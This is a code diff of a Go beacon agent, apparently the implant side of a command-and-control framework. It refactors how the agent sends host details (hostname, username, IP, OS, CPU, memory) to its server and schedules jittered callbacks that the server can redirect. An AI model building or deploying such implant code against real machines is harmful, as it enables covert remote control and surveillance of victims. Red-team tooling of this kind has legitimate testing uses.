@@ -42,7 +42,8 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := client_utils.GetLocalIP(beacon)
-		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory); err != nil {
+		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
+		if err := client_utils.HandleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback); err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
@@ -59,63 +60,14 @@ func main() {
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
-		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
-	}
-}
+		sleepDuration := time.Until(nextCallback)
 
-func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory string) error {
-	configReq := createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip)
-	if err := client_utils.SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
-		return err
-	}
-
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
-		return err
-	}
-
-	if response.Type == types.ConfigurationResponseType {
-		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
-			updateClientConfig(configResponse)
+		if sleepDuration > 0 {
+			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
+			time.Sleep(sleepDuration)
 		} else {
-			return fmt.Errorf("unexpected payload type")
+			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
 		}
-	} else {
-		return fmt.Errorf("unexpected response type: %v", response.Type)
-	}
-	return nil
-}
-
-func createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip string) types.ConfigurationRequest {
-	return types.ConfigurationRequest{
-		AgentID:           agentID,
-		Username:          username,
-		Hostname:          hostname,
-		OSType:            osType,
-		OSArch:            osArch,
-		OSBuild:           osVersion,
-		CPUS:              cpus,
-		MEMORY:            memory,
-		AgentIP:           ip,
-		ServerIP:          ServerIP,
-		ServerPort:        ServerPort,
-		CallbackFrequency: CallbackFrequency,
-		CallbackJitter:    CallbackJitter,
-		MasterKey:         "MASTERKEY",
-	}
-}
-
-func updateClientConfig(config types.ConfigurationResponse) {
-	updateConfigField(&ServerIP, config.ServerIP, "callback IP")
-	updateConfigField(&ServerPort, config.ServerPort, "callback port")
-	updateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
-	updateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
-}
-
-func updateConfigField(current *string, new, fieldName string) {
-	if *current != new {
-		logger.Logf(logger.Info, "Updating %s", fieldName)
-		*current = new
 	}
 }
 
